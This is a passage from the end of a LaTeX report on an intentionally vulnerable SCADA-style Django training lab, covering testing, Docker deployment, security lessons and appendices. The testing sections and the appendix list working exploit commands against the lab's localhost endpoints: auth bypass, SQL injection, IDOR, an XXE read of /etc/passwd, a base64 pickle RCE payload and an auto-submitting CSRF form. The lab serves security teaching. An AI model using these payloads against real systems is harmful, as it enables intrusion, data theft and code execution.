\end{itemize}

\subsection{Log Viewer}

Monitoring logs are accessible at:
\begin{itemize}[leftmargin=*]
    \item \texttt{/monitoring/} - Shows attacks on vulnerable version
    \item \texttt{/monitoring/patched/} - Shows attacks on patched version
\end{itemize}

Each log entry displays:
\begin{itemize}[leftmargin=*]
    \item Timestamp
    \item Severity badge (color-coded: CRITICAL=red, HIGH=orange, MEDIUM=blue, LOW=gray)
    \item Attack type classification
    \item Target endpoint
    \item Attacker IP address
    \item Recommended action
    \item Action buttons (Block IP / Revoke Session / Resolve)
    \item Resolution status and admin notes
    \item Payload details (truncated to 500 characters)
\end{itemize}

The interface includes filtering by severity, action taken, and resolution status.

\newpage

% Testing and Validation
\section{Testing and Validation}

\subsection{Testing Methodology}

All vulnerabilities were tested using multiple approaches:
\begin{enumerate}[leftmargin=*]
    \item \textbf{Manual Testing:} Using curl and browser developer tools
    \item \textbf{Automated Tools:} Burp Suite and OWASP ZAP
    \item \textbf{Custom Scripts:} Python scripts for payload generation
\end{enumerate}

\subsection{Test Results Summary}

\begin{table}[h]
\centering
\begin{tabular}{|l|c|c|c|}
\hline
\textbf{Vulnerability} & \textbf{Vulnerable} & \textbf{Patched} & \textbf{Monitoring} \\
\hline
Auth Bypass & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
\hline
SQL Injection & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
\hline
IDOR & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
\hline
Deserialization & ✓ RCE & ✓ Blocked & ✓ Detected \\
\hline
File Upload & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
\hline
XXE & ✓ File Read & ✓ Blocked & ✓ Detected \\
\hline
Race Condition & ✓ Data Leak & ✓ Blocked & N/A \\
\hline
SSRF & ✓ Internal Access & ✓ Blocked & ✓ Detected \\
\hline
\end{tabular}
\caption{Vulnerability Testing Results}
\end{table}

\subsection{Pentesting Tools Used}

\subsubsection{Burp Suite Community Edition}
\begin{itemize}[leftmargin=*]
    \item Proxy for request interception
    \item Intruder for automated IDOR testing (ID 103-153)
    \item Repeater for manual payload testing
    \item Scanner for active/passive vulnerability detection
\end{itemize}

\subsubsection{OWASP ZAP (Zed Attack Proxy) - Planned Testing}
Open-source automated web application security scanner planned for comprehensive vulnerability validation. ZAP will be used to verify all identified vulnerabilities through automated scanning, including SQL injection detection, authentication bypass testing, CSRF validation, SSRF checks, XXE detection, and information disclosure analysis.
 
\subsubsection{curl}
Used for rapid manual testing and automation:
\begin{lstlisting}[language=bash]
# Auth bypass test
curl "http://localhost:8000/vulnerable/login/?username=test&is_admin=true"

# IDOR enumeration
for i in {1..100}; do
  curl "http://localhost:8000/vulnerable/report/?id=$i" -o "report_$i.pdf"
done

# SQL Injection test
curl "http://localhost:8000/vulnerable/dashboard/?connector=OR&name__icontains=NUCLEAR"

# SSRF test
curl -X POST http://localhost:8000/vulnerable/ssrf/ \
  -d "url=http://127.0.0.1:8000/admin/"
\end{lstlisting}

\subsection{Database Validation}

Database population verified:
\begin{lstlisting}[language=bash]
docker compose exec web python manage.py shell
>>> from core.models import Device, MaintenanceLog, DiagnosticReport
>>> Device.objects.count()
21
>>> MaintenanceLog.objects.count()
100
>>> DiagnosticReport.objects.count()
51
>>> Device.objects.get(name="NUCLEAR-CORE-CONTROLLER")
<Device: NUCLEAR-CORE-CONTROLLER (is_locked_out=True)>
\end{lstlisting}

Total records: 21 devices + 100 maintenance logs + 51 diagnostic reports = 172 entries in database.

\newpage

% Deployment
\section{Deployment}

\subsection{Docker Configuration}

\subsubsection{Dockerfile}

\begin{lstlisting}[language=Docker]
FROM python:3.12-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 8000

CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
\end{lstlisting}

\subsubsection{docker-compose.yml}

\begin{lstlisting}[language=YAML]
version: '3.8'

services:
  web:
    build: .
    command: python manage.py runserver 0.0.0.0:8000
    volumes:
      - .:/app
    ports:
      - "8000:8000"
    environment:
      - PYTHONUNBUFFERED=1
\end{lstlisting}

\subsection{Deployment Steps}

\begin{lstlisting}[language=bash]
# Clone repository
git clone https://github.com/orhunburakiyanc/Vulnerable-SCADA-Environment.git
cd Vulnerable-SCADA-Environment/scada_security_lab

# Start container
docker compose up -d

# Initialize database
docker compose exec web python manage.py migrate
docker compose exec web python manage.py populate_db

# Access application
# Vulnerable: http://localhost:8000/vulnerable/login/
# Patched: http://localhost:8000/patched/login/
# Monitoring: http://localhost:8000/monitoring/
\end{lstlisting}

\subsection{Volume Mapping}

The \texttt{.:/app} volume mapping enables live code updates:
\begin{itemize}[leftmargin=*]
    \item Edit files in VS Code
    \item Changes instantly reflected in container
    \item No rebuild required for code changes
    \item Database persists in \texttt{db.sqlite3} outside container
\end{itemize}

\newpage

% Security Best Practices
\section{Security Best Practices}

\subsection{Lessons Learned}

\subsubsection{Input Validation}
\begin{itemize}[leftmargin=*]
    \item Always use whitelist approach over blacklist
    \item Validate data type, length, format, and range
    \item Never trust client-side validation alone
\end{itemize}

\subsubsection{Authentication \& Authorization}
\begin{itemize}[leftmargin=*]
    \item Explicitly set authorization flags server-side
    \item Implement role-based access control (RBAC)
    \item Verify resource ownership before granting access
    \item Use POST for state-changing operations
\end{itemize}

\subsubsection{Safe Deserialization}
\begin{itemize}[leftmargin=*]
    \item Prefer JSON, Protocol Buffers over pickle
    \item Validate object types after deserialization
    \item Implement integrity checks (HMAC signatures)
\end{itemize}

\subsubsection{File Operations}
\begin{itemize}[leftmargin=*]
    \item Use UUID-based filenames to prevent collisions
    \item Generate unique temp files per request
    \item Clean up temporary files after use
    \item Whitelist allowed file extensions and MIME types
\end{itemize}

\subsection{Recommended Security Headers}

\begin{lstlisting}[language=Python]
# settings.py
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
\end{lstlisting}

\subsection{Dependency Management}

Regular updates required for:
\begin{itemize}[leftmargin=*]
    \item Django framework (currently 6.0)
    \item Third-party libraries (lxml, reportlab, requests)
    \item Python runtime environment
\end{itemize}

Use tools like \texttt{pip-audit} or \texttt{safety} to scan for known vulnerabilities:

\begin{lstlisting}[language=bash]
pip install safety
safety check
\end{lstlisting}

\newpage

% References
\section{References}

\begin{enumerate}[leftmargin=*]
    \item Django Security Documentation. \url{https://docs.djangoproject.com/en/5.0/topics/security/}
    
    \item OWASP Top 10 Web Application Security Risks. \url{https://owasp.org/www-project-top-ten/}
    
    \item OWASP Common Weakness Enumeration (CWE). \url{https://cwe.mitre.org/}
    
    \item PortSwigger Web Security Academy. \url{https://portswigger.net/web-security}
    
    \item Python pickle module documentation. \url{https://docs.python.org/3/library/pickle.html}
    
    \item lxml Security Documentation. \url{https://lxml.de/FAQ.html#how-do-i-use-lxml-safely-as-a-web-service-endpoint}
    
    \item NIST SP 800-82 Rev. 3: Guide to Operational Technology (OT) Security. \url{https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final}
    
    \item Docker Security Best Practices. \url{https://docs.docker.com/develop/security-best-practices/}
    
    \item SQLmap Documentation. \url{https://github.com/sqlmapproject/sqlmap/wiki}
\end{enumerate}

\newpage

% Appendix
\appendix

\section{Appendix A: Source Code Repository}

Full source code available at:\\
\url{https://github.com/orhunburakiyanc/Vulnerable-SCADA-Environment}

Repository structure:
\begin{itemize}[leftmargin=*]
    \item \texttt{scada\_security\_lab/} - Main Django project
    \item \texttt{PENTESTING\_GUIDE.md} - Detailed exploitation guide
    \item \texttt{create\_pickle\_payload.py} - RCE payload generator
    \item \texttt{xxe\_attack.xml} - XXE exploitation file
    \item \texttt{docker-compose.yml} - Container orchestration
    \item \texttt{requirements.txt} - Python dependencies
\end{itemize}

\section{Appendix B: Database Schema}

\subsection{Device Table}
\begin{lstlisting}[language=SQL]
CREATE TABLE core_device (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name VARCHAR(100) NOT NULL,
    device_type VARCHAR(50) NOT NULL,
    status VARCHAR(20) NOT NULL,
    is_locked_out BOOLEAN DEFAULT 0
);
\end{lstlisting}

\subsection{AttackLog Table}
\begin{lstlisting}[language=SQL]
CREATE TABLE monitoring_attacklog (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45) NOT NULL,
    endpoint VARCHAR(200) NOT NULL,
    attack_type VARCHAR(100) NOT NULL,
    payload TEXT
);
\end{lstlisting}

\section{Appendix C: Pentesting Commands}

Quick reference for all exploitation commands:

\begin{lstlisting}[language=bash]
# Authentication Bypass
curl "http://localhost:8000/vulnerable/login/?username=hacker&is_admin=true"

# SQL Injection - reveal critical NUCLEAR devices
curl "http://localhost:8000/vulnerable/dashboard/?connector=OR&name__icontains=NUCLEAR"

# IDOR
curl "http://localhost:8000/vulnerable/report/?id=103" -o admin_secret.pdf

# File Upload & Overwrite
echo "MALICIOUS SCRIPT" > diagnostic_script.txt
curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@diagnostic_script.txt"

# XXE
cat > xxe_attack.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><content>&xxe;</content></data>
EOF
curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@xxe_attack.xml"

# Deserialization RCE
python3 create_pickle_payload.py
curl -X POST http://localhost:8000/vulnerable/deserialize/ \
  -d "diagnostic_data=gASVSwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDBlY2hvICJNQUxJQ0lPVVMgQ09ERSBFWEVDVVRFRCEiID4gL3RtcC9wd25lZC50eHSUhZRSlC4="
docker compose exec web cat /tmp/pwned.txt

# SSRF
curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"

# Security Misconfiguration
curl "http://localhost:8000/vulnerable/login/?username=user&password=fake"
curl "http://localhost:8000/monitoring/"  # Unauthorized access to logs

# Maintenance Interface CSRF & Authorization Bypass
# Step 1: Login as regular user
curl -X POST http://localhost:8000/vulnerable/login/ \
  -d "username=user&password=user123" -c cookies.txt

# Step 2: Access maintenance interface (no authorization check)
curl http://localhost:8000/vulnerable/maintenance/ -b cookies.txt

# Step 3: Assign technician without admin privileges
curl -X POST http://localhost:8000/vulnerable/assign/15/ \
  -b cookies.txt -d "technician_name=Attacker&action=Unauthorized%20Modification"

# Step 4: CSRF Attack - Create malicious HTML
cat > csrf_maintenance.html << 'EOF'
<html><body onload="document.forms[0].submit()">
<form method="POST" action="http://localhost:8000/vulnerable/assign/15/">
  <input type="hidden" name="technician_name" value="MaliciousActor">
  <input type="hidden" name="action" value="Backdoor Installation">
</form></body></html>
EOF
# Victim admin opens this file in browser -> Auto-assigns technician

# Step 5: Toggle device status without CSRF protection
curl -X POST http://localhost:8000/vulnerable/toggle/12/ -b cookies.txt
\end{lstlisting}

\end{document}
